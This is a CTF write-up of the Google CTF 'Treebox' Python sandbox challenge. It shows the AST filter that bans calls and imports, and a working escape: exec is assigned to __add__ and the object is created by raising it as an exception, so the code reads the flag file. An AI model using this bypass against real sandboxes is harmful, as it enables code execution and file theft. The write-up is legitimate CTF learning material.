This google-ctf I couldn't solve any web challenges because I spent too much time trying dns-leaking on log4j challenge while the solution was to leak it thru the error logs.
Near the end of ctf, I tried out this sandbox challenge and solved it. I will try sharing my journey for this flag with you.

# Treebox


## Challenge description

![image](https://user-images.githubusercontent.com/24471300/178110819-a099530b-9301-4f65-84a6-cfb78638fcec.png)

The challenge was at a netcat server. We were also provided with a python file treebox.py:

```python
#!/usr/bin/python3 -u
#
# Flag is in a file called "flag" in cwd.
#
# Quote from Dockerfile:
#   FROM ubuntu:22.04
#   RUN apt-get update && apt-get install -y python3
#
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
```


## Almost everything blocked!

Running `treebox.py`, it was asking to enter code ending with "--END". If we try to simply read the flag, it was obvious it wouldn't work:

```
aa29>python treebox.py
-- Please enter code (last line must contain only --END)
print(open('flag').read())
--END
ERROR: Banned statement <ast.Call object at 0x0000021E8D097580>
```

At first I thought it was only filtering the dangerous functions like `exec` and `eval`, but apparently all function calls were blocked. 

```
aa29>python treebox.py
-- Please enter code (last line must contain only --END)
print("1")
--END
ERROR: Banned statement <ast.Call object at 0x00000183DBAC7580>
```

It was also blocking `import` command:

```
aa29>python treebox.py
-- Please enter code (last line must contain only --END)
import os
--END
ERROR: Banned statement <ast.Import object at 0x000001F1D4997850>
```

My first intuition was to try out creating a class with the code to print the flag in its constructor `__init__` so that when I create the object, it would run. But again creating a new object is like a function call anyways and it got blocked as:

```
aa29>python treebox.py
-- Please enter code (last line must contain only --END)
class A:
  def __init__(self):
    pass
a = A()
--END
ERROR: Banned statement <ast.Call object at 0x00000233873FED70>
```


## What was allowed?

Static access of functions (not actual calls) and operator-based evaluation was considered safe though:

```
aa29>python treebox.py
-- Please enter code (last line must contain only --END)
class A():
  def b():
    pass
A.b
c=8
a=c+9
--END
-- Executing safe code:
```

So the challenge was here to pass the arguments without actually making a function call. And that was when it hit me: The solution must be somewhere around magic/dunder methods in python!


## Magic/Dunder methods

You can actually overload the operators in python using the double-underscore or dunder methods like `__add__`, `__sub__`, etc. For instance, this example from [www.geeksforgeeks.org](https://www.geeksforgeeks.org/operator-overloading-in-python/)

```python
class A:
    def __init__(self, a):
        self.a = a
 
    # adding two objects
    def __add__(self, o):
        return self.a + o.a
ob1 = A(1)
ob2 = A(2)
ob3 = A("Geeks")
ob4 = A("For")
 
print(ob1 + ob2)
print(ob3 + ob4)
```

In the operation `ob1 + ob2` you are basically using the `+` operator to call the `__add__` method within object `ob1` with `ob2` as parameter `o`. This would evaluate to `3`.


## Creating an object

So we can use operator-overloading to call functions on objects,  there was still a challenge on how to create an actual object. I searched for it online on ctf writeups and wikis and came across with this neat idea:

```python
class K(Exception):
.
.
.

try:
    raise K
except K as k:
    k
```

So, basically we are raising an exception with class K(inheriting class Exception) and it gets caught in except block as an object k.


## The solution

Combining the object creation trick and operator-overloading trick, this was the solution I came up with:

```python
class A(Exception):
        def __add__(self,toexec):
                return 1
A.__add__ = exec
try:
        raise A
except A as a:
        a+"print(open('flag').read())"
```

I sent the code to the netcat server and got the flag:
```
Received: b'== proof-of-work: disabled ==\n'
Received: b'-- Please enter code (last line must contain only --END)\n'
Received: b'-- Executing safe code:'
Received: b'\nCTF{CzeresniaTopolaForsycja}\n\n'
```